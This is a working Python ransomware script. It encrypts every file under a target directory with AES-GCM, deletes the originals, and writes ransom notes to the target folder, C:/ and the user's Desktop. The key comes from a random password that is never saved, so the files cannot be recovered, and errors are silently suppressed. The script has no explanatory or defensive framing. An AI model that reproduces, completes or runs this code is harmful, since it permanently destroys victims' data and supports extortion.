import os
from pathlib import Path
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from concurrent.futures import ThreadPoolExecutor
import secrets

# --- Generate RANDOM password (NO RECOVERY) ---
password = secrets.token_hex(32)  # 256-bit random key

# --- Derive key from random password ---
SALT = secrets.token_bytes(16)  # Random salt
kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=SALT,
    iterations=100_000,
)
key = kdf.derive(password.encode())
aesgcm = AESGCM(key)

# --- Encryption function ---
def encrypt_file(file_path: Path):
    try:
        if file_path.suffix == ".enc":
            return
        data = file_path.read_bytes()
        nonce = os.urandom(12)
        encrypted = aesgcm.encrypt(nonce, data, None)
        enc_path = file_path.with_suffix(file_path.suffix + ".enc")
        enc_path.write_bytes(nonce + encrypted)
        file_path.unlink()
    except Exception:
        pass

# --- Gather files ---
def gather_files(drive: Path):
    skip_dirs = {"Windows", "Program Files", "Program Files (x86)", "$Recycle.Bin", "System Volume Information"}
    files = []
    for root, dirs, filenames in os.walk(drive):
        dirs[:] = [d for d in dirs if d not in skip_dirs]
        for f in filenames:
            files.append(Path(root) / f)
    return files

# --- Main function ---
def main():
    drive = Path("D:/Hello")
    if not drive.exists():
        return

    all_files = gather_files(drive)
    
    # Create a ransom note with the key
    ransom_note = f"""
    YOUR FILES HAVE BEEN ENCRYPTED
    
    All your files have been encrypted with military-grade AES-256 encryption.
    """
    
    # Save ransom note to multiple locations
    note_locations = [
        drive / "READ_ME_FOR_RECOVERY.txt",
        Path("C:/") / "RECOVERY_INSTRUCTIONS.txt",
        Path(os.path.expanduser("~/Desktop")) / "YOUR_FILES_ARE_ENCRYPTED.txt"
    ]
    
    for note_path in note_locations:
        try:
            with open(note_path, 'w', encoding='utf-8') as f:
                f.write(ransom_note)
        except:
            pass

    # Encrypt files silently
    with ThreadPoolExecutor(max_workers=os.cpu_count() or 4) as executor:
        executor.map(encrypt_file, all_files)

if __name__ == "__main__":
    main()